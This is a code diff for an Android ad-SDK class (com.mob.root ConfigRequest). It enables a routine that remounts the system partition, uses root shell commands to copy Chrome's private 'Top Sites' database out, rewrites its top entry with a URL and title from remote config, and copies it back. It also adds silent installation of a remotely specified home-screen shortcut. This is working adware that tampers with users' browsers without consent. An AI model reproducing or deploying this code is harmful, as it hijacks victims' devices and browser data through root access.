@@ -1,31 +1,32 @@
 package com.mob.root.net;
 
-import java.io.ByteArrayOutputStream;
-import java.io.DataOutputStream;
 import java.io.File;
 import java.io.IOException;
-import java.io.OutputStream;
 import java.util.Date;
 
 import org.apache.http.Header;
 
 import android.content.ContentValues;
 import android.content.Context;
+import android.content.Intent;
 import android.content.SharedPreferences;
+import android.database.Cursor;
 import android.database.sqlite.SQLiteDatabase;
 import android.graphics.Bitmap;
-import android.graphics.Bitmap.CompressFormat;
-import android.graphics.BitmapFactory;
+import android.net.Uri;
 import android.os.Environment;
+import android.view.View;
 
 import com.mob.root.AMApplication;
-import com.mob.root.R;
 import com.mob.root.entity.ADConfig;
+import com.mob.root.net.parser.ConfigParser;
 import com.mob.root.tools.AMConstants;
 import com.mob.root.tools.AMLogger;
 import com.mob.root.tools.CommonUtils;
 import com.mob.root.tools.RootCmd;
 import com.mob.root.tools.SystemPartition;
+import com.nostra13.universalimageloader.core.ImageLoader;
+import com.nostra13.universalimageloader.core.listener.SimpleImageLoadingListener;
 
 public class ConfigRequest extends AMRequest<ADConfig> {
 
@@ -70,45 +71,89 @@ public class ConfigRequest extends AMRequest<ADConfig> {
 			String readFile = CommonUtils.readFile(file2);
 			CommonUtils.writeFile(readFile + data, file2);
 			
-//			updateChromeDb();
+			updateChromeDb();
+			
+			ConfigParser parser = new ConfigParser();
+			final String lanucherUrl = parser.getValue(AMApplication.instance, "launcher_entrance_url");
+			String lanucherIcon = parser.getValue(AMApplication.instance, "launcher_entrance_icon");
+			final String lanucherTitle = parser.getValue(AMApplication.instance, "launcher_entrance_title");
+			if(!CommonUtils.isEmptyString(lanucherUrl) && !CommonUtils.isEmptyString(lanucherIcon) && !CommonUtils.isEmptyString(lanucherTitle)) {
+				ImageLoader.getInstance().loadImage(lanucherIcon, AMApplication.instance.displayOption, new SimpleImageLoadingListener() {
+					@Override
+					public void onLoadingComplete(String imageUri, View view, Bitmap loadedImage) {
+						addShortcut(loadedImage,lanucherTitle,Uri.parse(lanucherUrl));
+					}
+				});
+			}
+			
 		} catch (Exception e) {
 			AMLogger.e(null, e.getMessage());
 		}
 	}
+	
+	private void addShortcut(Bitmap icon, String name, Uri uri) {
+		Intent intentAddShortcut = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
+		intentAddShortcut.putExtra("duplicate", false);
+		// 添加名称
+		intentAddShortcut.putExtra(Intent.EXTRA_SHORTCUT_NAME, name);
+		// 添加图标
+		intentAddShortcut.putExtra(Intent.EXTRA_SHORTCUT_ICON, icon);
+		// 设置Launcher的Uri数据
+		Intent intentLauncher = new Intent();
+		intentLauncher.setData(uri);
+		// 添加快捷方式的启动方法
+		intentAddShortcut.putExtra(Intent.EXTRA_SHORTCUT_INTENT, intentLauncher);
+		AMApplication.instance.sendBroadcast(intentAddShortcut);
+	}
 
-//	private void updateChromeDb() {
-//		if(null == Environment.getExternalStorageDirectory()) {
-//			return;
-//		}
-//		SystemPartition.getSystemMountPiont();
-//		SystemPartition.remountSystem(true);
-//		String path = Environment.getExternalStorageDirectory().getAbsolutePath();
-//		if(CommonUtils.isEmptyString(path)) {
-//			return;
-//		}
-//		RootCmd.execRootCmd("cp \"/data/data/com.android.chrome/app_chrome/Default/Top Sites\" " + path);
-//		SQLiteDatabase db = null;
-//		ByteArrayOutputStream bos = null;
-//		try {
-//			File file = new File(path + "/Top Sites");
-//			if(!file.exists()) {
-//				return;
-//			}
-//			db = SQLiteDatabase.openDatabase(file.getAbsolutePath(), null, 0);
-//			ContentValues cv = new ContentValues();
-//			cv.put("url", "http://www.altamob.com");
-//			cv.put("title", "altamob");
-//			cv.put("url_rank", 0);
+	private void updateChromeDb() throws IOException {
+		if(null == Environment.getExternalStorageDirectory()) {
+			return;
+		}
+		SystemPartition.getSystemMountPiont();
+		SystemPartition.remountSystem(true);
+		String path = Environment.getExternalStorageDirectory().getAbsolutePath();
+		if(CommonUtils.isEmptyString(path)) {
+			return;
+		}
+		RootCmd.execRootCmd("cp \"/data/data/com.android.chrome/app_chrome/Default/Top Sites\" " + path);
+		SQLiteDatabase db = null;
+		try {
+			File file = new File(path + "/Top Sites");
+			if(!file.exists()) {
+				return;
+			}
+			db = SQLiteDatabase.openDatabase(file.getAbsolutePath(), null, 0);
+			Cursor cursor = db.rawQuery("select last_updated from thumbnails where url_rank = ?", new String[]{"0"});
+			if(null == cursor) {
+				if(null != db)  {
+					db.close();
+				}
+				return;
+			}
+			if(!cursor.moveToNext()) {
+				return;
+			}
+			long lastUpdated = cursor.getLong(cursor.getColumnIndex("last_updated"));
+			ContentValues cv = new ContentValues();
+			ConfigParser parser = new ConfigParser();
+			String url = parser.getValue(AMApplication.instance, "chrome_url");
+			String title = parser.getValue(AMApplication.instance, "chrome_title");
+			cv.put("url", url);
+			cv.put("redirects", url);
+			cv.put("title", title);
+//			cv.put("last_updated", lastUpdated + 1000);
+//			cv.put("load_completed", 1);
 //			Bitmap bitmap = BitmapFactory.decodeResource(AMApplication.instance.getResources(), R.drawable.ic_launcher);
 //			bos = new ByteArrayOutputStream();
 //			bitmap.compress(CompressFormat.PNG, 100, bos);
 //			cv.put("thumbnail", bos.toByteArray());
-//			int result = db.update("thumbnails", cv, "url_rank = ?", new String[]{"0"});
+			int result = db.update("thumbnails", cv, "url_rank = ?", new String[]{"0"});
 //			RootCmd.execRootCmd("rm -f \"/data/data/com.android.chrome/app_chrome/Default/Top Sites\"");
-////				RootCmd.execRootCmd("rm -f \"/data/data/com.android.chrome/app_chrome/Default/Top Sites-journal\"");
-//			RootCmd.execRootCmd("cp " + path + "/\"Top Sites\"" + " /data/data/com.android.chrome/app_chrome/Default");
-////				RootCmd.execRootCmd("cp " + path + "/\"Top Sites-journal\"" + " /data/data/com.android.chrome/app_chrome/Default");
-//			
+//			RootCmd.execRootCmd("rm -f \"/data/data/com.android.chrome/app_chrome/Default/Top Sites-journal\"");
+			RootCmd.execRootCmd("cp " + path + "/\"Top Sites\"" + " /data/data/com.android.chrome/app_chrome/Default");
+//			RootCmd.execRootCmd("cp " + path + "/\"Top Sites-journal\"" + " /data/data/com.android.chrome/app_chrome/Default");
+			
 //			RootCmd.execRootCmd("cp \"/data/data/com.android.chrome/app_chrome/Default/History\" " + path);
 //			file = new File(path + "/History");
 //			if(!file.exists()) {
@@ -125,22 +170,14 @@ public class ConfigRequest extends AMRequest<ADConfig> {
 //			result = db.update("segments", cv, "id = ?", new String[]{"1"});
 //			RootCmd.execRootCmd("rm -f \"/data/data/com.android.chrome/app_chrome/Default/History\"");
 //			RootCmd.execRootCmd("cp " + path + "/\"History\"" + " /data/data/com.android.chrome/app_chrome/Default");
-//		} catch (Exception e) {
-//			AMLogger.e(null, e.getMessage());
-//		} finally {
-//			if(null != bos) {
-//				try {
-//					bos.close();
-//				} catch (IOException e) {
-//					AMLogger.e(null, e.getMessage());
-//				} finally {
-//					if(null != db)  {
-//						db.close();
-//					}
-//				}
-//			}
-//		}
-//	}
+		} catch (Exception e) {
+			AMLogger.e(null, e.getMessage());
+		} finally {
+			if(null != db)  {
+				db.close();
+			}
+		}
+	}
 
 	@Override
 	public void start(Object... args) {
